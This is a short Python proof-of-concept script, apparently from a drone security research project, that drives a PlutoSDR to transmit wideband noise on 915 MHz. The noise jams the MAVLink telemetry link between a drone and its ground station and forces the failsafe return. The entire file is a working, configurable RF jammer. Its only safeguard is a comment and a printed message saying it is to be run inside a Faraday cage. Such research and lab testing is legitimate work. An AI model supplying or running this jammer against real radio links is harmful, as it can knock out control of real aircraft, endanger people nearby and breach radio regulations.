#!/usr/bin/env python3
"""PoC 05 - Telemetry link jamming / DoS (PWNUAV IM-01, IM-02).

Transmits wideband noise on 915 MHz with the Pluto to deny the drone<->GCS
MAVLink link and trip the failsafe (RTL). ONLY in a Faraday cage.
Requires SoapySDR + SoapyPlutoSDR.
"""
from __future__ import annotations

import argparse

import numpy as np

from pwnuav.rf.gfsk import FS
from pwnuav.rf.soapy_io import HAVE_SOAPY, SdrSink


def main() -> None:
    ap = argparse.ArgumentParser(description="PWNUAV PoC 05 - jamming 915 MHz")
    ap.add_argument("--freq", type=float, default=915e6)
    ap.add_argument("--seconds", type=float, default=10.0)
    ap.add_argument("--gain", type=float, default=60)
    args = ap.parse_args()
    if not HAVE_SOAPY:
        raise SystemExit("SoapySDR not installed; cannot transmit.")
    rng = np.random.default_rng()
    block = (rng.standard_normal(int(FS // 10))
             + 1j * rng.standard_normal(int(FS // 10))).astype(np.complex64)
    block *= 0.7 / np.max(np.abs(block))
    sink = SdrSink(freq=args.freq, fs=FS, gain=args.gain, driver="plutosdr")
    print(f"[*] Jamming {args.freq/1e6:.3f} MHz for {args.seconds}s (ONLY IN A CAGE)")
    try:
        for _ in range(int(args.seconds * 10)):
            sink.send(block)
    finally:
        sink.close()
    print("[+] Jamming stopped")


if __name__ == "__main__":
    main()
